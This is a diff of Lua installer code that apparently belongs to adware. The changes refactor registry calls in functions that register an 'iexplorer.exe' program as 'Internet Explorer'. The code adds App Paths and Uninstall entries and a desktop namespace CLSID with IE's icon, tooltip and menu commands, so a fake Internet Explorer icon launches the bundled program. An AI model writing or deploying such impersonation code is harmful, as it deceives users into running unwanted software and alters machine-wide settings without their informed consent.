@@ -703,7 +703,7 @@ function WriteIERegister()
 	local bIs64 = FunctionObj.CheckIs64OS()
 	
 	local strIEPath = GetIEPath()
-	tipUtil:CreateRegKey("HKEY_CURRENT_USER","SOFTWARE\\iexplorer")
+	FunctionObj.CreateRegKey("HKEY_CURRENT_USER","SOFTWARE\\iexplorer")
 	bret = FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path", strIEPath, bIs64)
 
 	local strPid = FunctionObj.GetPeerID()
@@ -720,10 +720,10 @@ function WriteIERegister()
 	
 	-------
 	local bInfMode = true
-	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe")
+	FunctionObj.CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe", bIs64)
 	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe\\", strIEPath, bIs64, bInfMode)
 	
-	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe")
+	FunctionObj.CreateRegKey("HKEY_LOCAL_MACHINE","Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe", bIs64)
 	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayName", "Internet Explorer", bIs64, bInfMode)
 	
     local strUninstPath = tipUtil:PathCombine(strInstallDir, "uninst.exe")
@@ -1140,28 +1140,28 @@ function CreateDesktopReg()
 	local bIs64 = FunctionObj.CheckIs64OS()
 	local bInfMode = true
 	
-	local bret = tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}")
+	local bret = FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}", bIs64)
 	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\InfoTip", "查找并显示 Iternet 上的信息和网站。", bIs64, bInfMode)
 	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\LocalizedString", "Internet Explorer", bIs64, bInfMode)
 
 	local strIEPath = GetIEPath()
-	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon")
+	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon", bIs64)
 	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon\\", strIEPath, bIs64, bInfMode)
 
-	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open")
+	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open", bIs64)
 	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\", "打开主页(&H)", bIs64, bInfMode)
 	
 	strCmd = "\"" ..strIEPath.. "\"".." /sstartfrom desktopnamespace"
-	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command")
+	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command", bIs64)
 	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command\\", strCmd, bIs64, bInfMode)
 	
-	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop")
+	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop", bIs64)
 	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\", "属性(&R)", bIs64, bInfMode)
 		
-	tipUtil:CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command")
+	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command", bIs64)
 	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command\\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl", bIs64, bInfMode)
 	
-	tipUtil:CreateRegKey("HKEY_LOCAL_MACHINE","SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}")
+	FunctionObj.CreateRegKey("HKEY_LOCAL_MACHINE","SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}", bIs64)
 	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\", "Internet Exploer", bIs64, bInfMode)
 	
 	tipUtil:RefleshIcon(nil)
